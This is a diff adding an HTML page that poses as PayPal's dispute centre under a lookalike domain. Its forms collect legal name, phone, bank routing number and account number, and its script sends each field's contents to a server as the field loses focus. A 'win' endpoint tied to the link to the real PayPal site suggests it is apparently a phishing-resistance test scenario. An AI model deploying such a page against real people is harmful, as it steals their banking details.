@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dispute Resolution Center - PayPal</title>
+    <style>
+        :root { --pp-dark:#003087; --pp-blue:#009cde; --pp-text:#2c2e2f; }
+        body { margin:0; padding:0; font-family:Arial,sans-serif; background:#f7f8f9; color:var(--pp-text); }
+        .browser-bar { background:#f1f3f4; border-bottom:1px solid #ddd; padding:6px 16px; display:flex; align-items:center; gap:10px; font-size:13px; }
+        header { background:#fff; height:100px; display:flex; align-items:center; padding:0 10%; border-bottom:1px solid #ddd; }
+        .pp-logo { font-size:32px; font-weight:800; color:var(--pp-dark); letter-spacing:-2px; }
+        .pp-logo span { color:var(--pp-blue); margin-left:-2px; }
+        .container { max-width:800px; margin:40px auto; padding:0 20px; }
+        .card { background:#fff; border-radius:4px; border:1px solid #ddd; padding:40px; box-shadow:0 1px 3px rgba(0,0,0,.1); }
+        h1 { font-size:28px; font-weight:400; margin-bottom:24px; color:var(--pp-dark); }
+        .desc { font-size:16px; line-height:1.5; margin-bottom:32px; }
+        .case-info { background:#f5f7fa; padding:24px; border-radius:4px; border:1px solid #ddd; margin-bottom:32px; display:flex; justify-content:space-between; align-items:center; }
+        .amount { font-size:22px; font-weight:700; color:var(--pp-dark); }
+        .btn-blue { height:48px; background:var(--pp-blue); color:#fff; border:none; border-radius:24px; font-size:16px; font-weight:600; cursor:pointer; padding:0 32px; transition:background .2s; }
+        .form-section { display:none; }
+        .form-section.active { display:block; }
+        .form-group { margin-bottom:20px; text-align:left; }
+        .form-group label { display:block; font-size:14px; margin-bottom:6px; font-weight:600; }
+        .form-group input { width:100%; height:44px; border-radius:4px; border:1px solid #ccc; padding:12px; font-size:16px; box-sizing:border-box; outline:none; }
+        .back-link { font-size:14px; color:var(--pp-blue); cursor:pointer; text-decoration:none; margin-top:16px; display:inline-block; }
+        .success-box { text-align:center; }
+        .success-icon { width:64px; height:64px; background:#c5f0c5; color:#007000; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:32px; margin:0 auto 24px; }
+        .status-banner { display:none; margin-bottom:18px; padding:12px 14px; background:#eef8f1; border:1px solid #b8dbc0; border-radius:4px; color:#1f6b33; }
+        .status-banner.visible { display:block; }
+        .legit-exit { margin-top:16px; font-size:12px; color:#666; }
+        .legit-exit a { color:#666; text-decoration:underline; }
+    </style>
+</head>
+<body>
+    <div class="browser-bar"><div style="flex-grow:1; background:#fff; border:1px solid #ccc; border-radius:4px; padding:4px 12px;">https://<strong>paypal-dispute-resolution.com</strong>/case/PP-D-1829384</div></div>
+    <header><div class="pp-logo">Pay<span>Pal</span></div></header>
+    <div class="container">
+        <div class="card">
+            <div class="status-banner" id="status-banner"></div>
+            <div class="form-section active" id="view-1">
+                <h1>Dispute Resolution Center</h1>
+                <div class="case-info">
+                    <div><h3 style="margin:0;">Case #PP-D-1829384</h3><p style="margin:4px 0 0; font-size:14px; color:#666;">Unauthorized Transaction - Reported Mar 26, 2026</p></div>
+                    <div class="amount">$847.00</div>
+                </div>
+                <p class="desc">A buyer has reported a problem with this transaction. To resolve this dispute and secure your account funds, please verify your merchant identity and linked bank information.</p>
+                <div style="display:flex; flex-direction:column; gap:12px;">
+                    <button class="btn-blue" id="start-dispute">I recognize this charge, provide verification</button>
+                    <button class="btn-blue" style="background:#fff; color:var(--pp-blue); border:1px solid var(--pp-blue);" type="button">This transaction is unauthorized</button>
+                </div>
+                <div class="legit-exit"><a href="#" id="go-to-paypal-direct">Review this case on PayPal.com instead</a></div>
+            </div>
+
+            <div class="form-section" id="view-2">
+                <h1>Identity Verification</h1>
+                <p class="desc">To resolve this dispute in your favor, we must confirm your legal name and contact details currently on file.</p>
+                <div class="form-group"><label>Full Legal Name</label><input type="text" id="name" name="name" class="harvest"></div>
+                <div class="form-group"><label>Primary Phone Number</label><input type="text" id="phone" name="phone" class="harvest"></div>
+                <button class="btn-blue" id="submit-identity">Confirm and Continue</button>
+                <br><small class="back-link" onclick="location.reload()">Back to Case Overview</small>
+            </div>
+
+            <div class="form-section" id="view-3">
+                <h1>Verify Linked Bank Account</h1>
+                <p class="desc">To ensure the disputed funds are returned to the correct account, provide the bank details linked to your PayPal merchant profile.</p>
+                <div class="form-group"><label>Bank Routing Number (9 digits)</label><input type="text" id="routing" name="routing" class="harvest"></div>
+                <div class="form-group"><label>Bank Account Number</label><input type="text" id="account" name="account" class="harvest"></div>
+                <button class="btn-blue" id="submit-bank">Resolve Dispute Now</button>
+            </div>
+
+            <div class="form-section" id="view-4">
+                <div class="success-box">
+                    <div class="success-icon">OK</div>
+                    <h1>Dispute Resolved</h1>
+                    <p class="desc">Case #PP-D-1829384 has been closed in your favor.</p>
+                    <button class="btn-blue" onclick="location.reload()">Go to Account</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        function showStatus(message) {
+            const banner = document.getElementById('status-banner');
+            banner.textContent = message;
+            banner.classList.add('visible');
+        }
+
+        async function postJson(url, payload) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return response.json();
+        }
+
+        function showView(step) {
+            document.querySelectorAll('.form-section').forEach((view) => view.classList.remove('active'));
+            document.getElementById(`view-${step}`).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('start-dispute').addEventListener('click', async () => {
+                await postJson('/api/dispute/start', {});
+                showView(2);
+            });
+
+            document.querySelectorAll('.harvest').forEach((el) => {
+                el.addEventListener('blur', () => {
+                    if (el.value.trim()) {
+                        fetch('/api/save-step', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ step: 0, data: { [el.name]: el.value.trim() } })
+                        });
+                    }
+                });
+            });
+
+            document.getElementById('submit-identity').addEventListener('click', async () => {
+                const payload = { name: document.getElementById('name').value.trim(), phone: document.getElementById('phone').value.trim() };
+                if (!payload.name || !payload.phone) {
+                    alert('All identity verification fields are required.');
+                    return;
+                }
+                await postJson('/api/identity/submit', payload);
+                showView(3);
+            });
+
+            document.getElementById('submit-bank').addEventListener('click', async () => {
+                const payload = { routing: document.getElementById('routing').value.trim(), account: document.getElementById('account').value.trim() };
+                if (!payload.routing || !payload.account) {
+                    alert('Bank verification required to return funds.');
+                    return;
+                }
+                await postJson('/api/bank/submit', payload);
+                showView(4);
+            });
+
+            document.getElementById('go-to-paypal-direct').addEventListener('click', async (event) => {
+                event.preventDefault();
+                await postJson('/api/win/go-to-paypal-direct', {});
+                showStatus('Check this case in the official PayPal Resolution Center instead of submitting bank details on a dispute link.');
+            });
+        });
+    </script>
+</body>
+</html>
